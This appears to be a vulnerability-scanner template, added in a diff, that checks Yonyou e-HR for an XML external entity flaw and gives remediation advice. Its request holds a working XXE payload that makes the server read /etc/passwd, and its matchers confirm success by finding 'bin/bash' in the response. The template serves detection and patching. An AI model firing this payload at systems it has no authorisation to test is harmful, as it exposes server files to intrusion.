@@ -1,0 +1,40 @@
+id: yonyou_EHR-xxe-smartweb2
+info:
+  name: Yonyou e-HR XXE Vulnerability
+  author:
+  - 折跃
+  description: |-
+    Yonyou e-HR XXE Vulnerability
+    Yonyou e-HR, the Yonyou human resource management system, is a human resource management software.
+
+    Yonyou e-HR has an XXE vulnerability caused by the program failing to properly validate XML external entities.
+  severity: high
+  remediation: |2-
+
+    Official remediation:
+    1. The vendor has released an upgrade patch to fix the vulnerability. Patch download link:
+    https://www.yonyou.com/
+
+    Temporary remediation:
+    1. Disable external entities.
+    2. Filter user-submitted XML data, blocking keywords such as <!DOCTYPE and <!ENTITY, or SYSTEM and PUBLIC.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'__profileKeys')
+    - contains(body,'bin/bash')
+  path:
+  - '{{BaseURL}}/hrss/dorado/smartweb2.RPC.d?__rpc=true'
+  method: POST
+  body: __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE
+    z [<!ENTITY test  SYSTEM "file:///etc/passwd" >]><rpc transaction="10" method="resetPwd"><def><dataset
+    type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r
+    id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
